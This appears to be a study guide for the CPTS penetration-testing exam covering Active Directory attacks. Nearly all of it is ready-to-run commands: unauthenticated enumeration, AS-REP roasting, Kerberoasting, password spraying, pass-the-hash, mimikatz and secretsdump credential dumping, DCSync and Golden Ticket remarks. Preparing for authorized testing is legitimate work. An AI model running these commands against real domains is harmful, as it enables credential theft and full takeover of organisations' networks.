# 12 — Active Directory Enumeration & Attacks

This is the largest module in the CPTS path (36 sections) and the most heavily tested on the exam. The CPTS exam network is an enterprise AD environment — every machine is domain-joined, and the ultimate objective is Domain Admin. You need to know AD attacks deeply.

---

## AD Enumeration Without Credentials

### From an unauthenticated position

```bash
# Identify the Domain Controller (ports 88, 389)
nmap -sV -p 53,88,135,389,445,636,3268 TARGET

# Null session enumeration
crackmapexec smb DC_IP -u '' -p ''
crackmapexec smb DC_IP -u '' -p '' --shares
crackmapexec smb DC_IP -u '' -p '' --users       # sometimes works
crackmapexec smb DC_IP -u '' -p '' --rid-brute    # enumerate users via RID cycling
crackmapexec smb DC_IP -u '' -p '' --pass-pol     # password policy (lockout threshold!)

# LDAP anonymous
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=com" -s base namingContexts
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName

# Kerbrute — enumerate valid usernames (no lockout, fast)
kerbrute userenum -d domain.com --dc DC_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP Roasting without knowing any users
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt
# users.txt = list of discovered or guessed usernames
```

### Getting that first set of credentials

```
Methods to get initial domain credentials:
  1. Web application exploitation → find creds in config/database
  2. LLMNR/NBT-NS poisoning (Responder) → capture NTLMv2 hashes → crack
  3. Password spraying with common passwords
  4. AS-REP Roasting (pre-auth disabled users)
  5. Anonymous SMB/LDAP enumeration → find user list → spray
  6. Credential reuse from non-domain services
  7. SNMP enumeration → reveals usernames → spray
  8. Kerberos user enumeration → valid users → spray
```

---

## AD Enumeration With Credentials

Once you have ANY valid domain credentials:

### CrackMapExec — the Swiss army knife

```bash
# Verify credentials work
crackmapexec smb DC_IP -u user -p 'password'
# [+] domain\user:password

# Enumerate users
crackmapexec smb DC_IP -u user -p pass --users

# Enumerate groups
crackmapexec smb DC_IP -u user -p pass --groups

# Enumerate shares on all machines
crackmapexec smb 10.10.10.0/24 -u user -p pass --shares

# Check for admin access across the network
crackmapexec smb 10.10.10.0/24 -u user -p pass
# Machines showing (Pwn3d!) = you have local admin

# Execute commands
crackmapexec smb TARGET -u user -p pass -x "whoami"
crackmapexec winrm TARGET -u user -p pass -x "whoami"

# Dump SAM (local hashes) from machines where you're admin
crackmapexec smb TARGET -u admin -p pass --sam

# Dump LSA secrets
crackmapexec smb TARGET -u admin -p pass --lsa

# Check for logged-on users
crackmapexec smb 10.10.10.0/24 -u user -p pass --loggedon-users
```

### BloodHound — find the attack path

```bash
# Collect data from the domain
bloodhound-python -u user -p 'password' -d domain.com -ns DC_IP -c all

# The -c all flag collects:
# Users, groups, computers, sessions, local admins, GPOs, ACLs, trusts

# Start BloodHound
sudo neo4j start
bloodhound &

# Import the .json files BloodHound collected

# KEY QUERIES in BloodHound:
# "Find Shortest Path to Domain Admin"
# "Find All Kerberoastable Users"
# "Find Principals with DCSync Rights"
# "Find Computers where Domain Users are Local Admin"
# "Shortest Paths to High Value Targets"
```

**BloodHound is mandatory for the CPTS.** The exam network has complex trust relationships and attack paths that are extremely difficult to find manually. BloodHound maps them visually.

### LDAP enumeration

```bash
# All users with descriptions (descriptions often contain passwords)
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -w 'pass' -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName description

# Service accounts (accounts with SPNs — Kerberoasting targets)
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -w 'pass' -b "DC=domain,DC=com" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# Users with "Do not require Kerberos preauthentication" (AS-REP targets)
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -w 'pass' -b "DC=domain,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName

# Domain Admins
ldapsearch -x -H ldap://DC_IP -D "user@domain.com" -w 'pass' -b "DC=domain,DC=com" "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)" sAMAccountName
```

---

## Kerberos Attacks

### AS-REP Roasting

**What it is:** Some accounts have "Do not require Kerberos pre-authentication" enabled. For these accounts, anyone can request a Kerberos ticket WITHOUT knowing the password — and that ticket contains a hash you can crack offline.

```bash
# With a user list
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# With credentials (finds AS-REP roastable users automatically)
impacket-GetNPUsers domain.com/user:pass -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# Crack the hashes
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

**What it is:** Service accounts have Service Principal Names (SPNs). Any authenticated domain user can request a service ticket (TGS) for any SPN. The ticket is encrypted with the service account's password hash — crack it offline.

```bash
# Request tickets for all service accounts
impacket-GetUserSPNs domain.com/user:pass -dc-ip DC_IP -request -outputfile tgs.txt

# Crack the hashes
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt

# If the cracked account is a Domain Admin → game over
```

**Why Kerberoasting is so effective:** Service accounts often have weak passwords, and requesting the ticket is a NORMAL operation — it doesn't trigger security alerts.

### Password spraying

```bash
# Check lockout policy FIRST
crackmapexec smb DC_IP -u user -p pass --pass-pol
# Lockout Threshold: 0 → no lockout, spray freely
# Lockout Threshold: 5 → stay under 5 attempts per user

# Spray
crackmapexec smb DC_IP -u users.txt -p 'Season2026!' --continue-on-success
crackmapexec smb DC_IP -u users.txt -p 'Company1!' --continue-on-success
kerbrute passwordspray -d domain.com users.txt 'Welcome1!' --dc DC_IP
```

---

## Lateral Movement

### Pass the Hash (PtH)

```bash
# With impacket
impacket-psexec domain/admin@TARGET -hashes LM:NTLM
impacket-wmiexec domain/admin@TARGET -hashes LM:NTLM
impacket-smbexec domain/admin@TARGET -hashes LM:NTLM

# With evil-winrm
evil-winrm -i TARGET -u admin -H NTLM_HASH

# With CrackMapExec
crackmapexec smb TARGET -u admin -H NTLM_HASH
crackmapexec smb TARGET -u admin -H NTLM_HASH -x "whoami"
```

### Pass the Ticket

```bash
# Export tickets from a compromised machine (Windows)
mimikatz# sekurlsa::tickets /export

# Import and use a ticket (Linux)
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec domain.com/user@TARGET -k -no-pass
```

### Remote execution tools

```bash
# PsExec (creates a service, runs as SYSTEM)
impacket-psexec domain/admin:pass@TARGET

# WMI (uses WMI, less artifacts than PsExec)
impacket-wmiexec domain/admin:pass@TARGET

# Evil-WinRM (uses WinRM, PowerShell session)
evil-winrm -i TARGET -u admin -p pass

# SMBExec (uses SMB, creates a service)
impacket-smbexec domain/admin:pass@TARGET

# RDP
xfreerdp /v:TARGET /u:domain\\admin /p:pass /cert-ignore
```

---

## Credential Dumping

### From a compromised machine (need local admin)

```bash
# Remote — secretsdump (SAM + LSA + cached creds + NTDS if DC)
impacket-secretsdump domain/admin:pass@TARGET
impacket-secretsdump domain/admin@TARGET -hashes LM:NTLM

# Local — mimikatz (on the Windows target itself)
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords       # plaintext passwords + NTLM hashes
mimikatz# lsadump::sam                    # local SAM database
mimikatz# lsadump::dcsync /domain:domain.com /user:administrator  # DCSync
```

### DCSync — the endgame

```bash
# Requires: Domain Admin, Enterprise Admin, or DC Replication rights
impacket-secretsdump domain.com/admin:pass@DC_IP

# This dumps EVERY hash in the domain:
# Administrator:500:aad3b435...:NTLM_HASH:::
# krbtgt:502:aad3b435...:NTLM_HASH:::        ← Golden Ticket material
# Every user in the domain...
```

**With the krbtgt hash, you can create Golden Tickets — unlimited domain access with any username, including non-existent ones.**

---

## AD Attack Chain Summary

```
1. GET CREDENTIALS (any domain user)
   Web app SQLi → database creds → credential reuse
   LLMNR poisoning → NTLMv2 hash → crack
   AS-REP Roasting → crack
   Password spraying → find weak password

2. ENUMERATE THE DOMAIN
   BloodHound → find attack path to Domain Admin
   CrackMapExec → find shares, admin access, users
   LDAP → find descriptions with passwords, SPNs

3. ESCALATE DOMAIN PRIVILEGES
   Kerberoasting → crack service account password
   Found admin on a machine → dump creds → find higher-priv user
   ACL abuse → modify permissions → grant yourself rights

4. LATERAL MOVEMENT
   PtH → access machines where found user is admin
   Evil-WinRM → PowerShell sessions
   Credential reuse → try passwords everywhere

5. DOMAIN COMPROMISE
   Get Domain Admin credentials
   DCSync → dump ALL hashes
   Access the Domain Controller → proof/flags
```
